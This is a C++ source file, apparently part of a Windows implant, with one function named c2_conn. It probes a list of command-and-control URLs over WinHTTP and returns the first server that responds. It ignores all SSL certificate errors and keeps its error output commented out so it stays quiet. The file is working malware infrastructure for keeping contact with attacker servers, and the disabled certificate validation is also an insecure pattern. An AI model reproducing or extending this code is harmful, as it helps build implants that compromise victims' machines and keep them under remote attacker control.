#include "c2_conn.h"
#include <windows.h>
#include <winhttp.h>
#include <algorithm>


// Function now takes a list of URLs and returns a string
std::wstring c2_conn(const std::vector<std::wstring>& urls)
{
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    int statusCode = -1;
    DWORD statusCodeSize = sizeof(statusCode);

    for (const std::wstring& url : urls)
    {
        URL_COMPONENTS urlComp;
        ZeroMemory(&urlComp, sizeof(urlComp));
        urlComp.dwStructSize = sizeof(urlComp);
        urlComp.dwSchemeLength = (DWORD)-1;
        urlComp.dwHostNameLength = (DWORD)-1;
        urlComp.dwUrlPathLength = (DWORD)-1;
        urlComp.dwExtraInfoLength = (DWORD)-1;

        if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp))
        {
            // std::wcout << L"Error in WinHttpCrackUrl: " << GetLastError() << std::endl;
            continue;
        }

        if (urlComp.nScheme != INTERNET_SCHEME_HTTP && urlComp.nScheme != INTERNET_SCHEME_HTTPS)
        {
            // std::wcout << L"Error: Unsupported scheme in the URL." << std::endl;
            continue;
        }

        std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
        std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
        INTERNET_PORT port = urlComp.nPort;

        hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession)
        {
            // std::wcout << L"Error in WinHttpOpen: " << GetLastError() << std::endl;
            continue;
        }

        hConnect = WinHttpConnect(hSession, hostname.c_str(), port, 0);
        if (!hConnect)
        {
            // std::wcout << L"Error in WinHttpConnect: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hSession);
            continue;
        }

        hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
        if (!hRequest)
        {
            // std::wcout << L"Error in WinHttpOpenRequest: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            continue;
        }

        // Set timeout to 10 seconds
        DWORD timeout = 10 * 1000; // 10 seconds in milliseconds
        WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

        // Ignore SSL certificate errors
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        {
            // std::wcout << L"Error in WinHttpSendRequest: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            continue;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL))
        {
            // std::wcout << L"Error in WinHttpReceiveResponse: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            continue;
        }

        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX,
            &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX))
        {
            // std::wcout << L"Error in WinHttpQueryHeaders: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            continue;
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        // If the server responds with any status code, it is considered as alive.
        if (statusCode != -1)
        {
            return url;
        }
    }

    // If no valid URL is found, return empty string
    return L"";
}
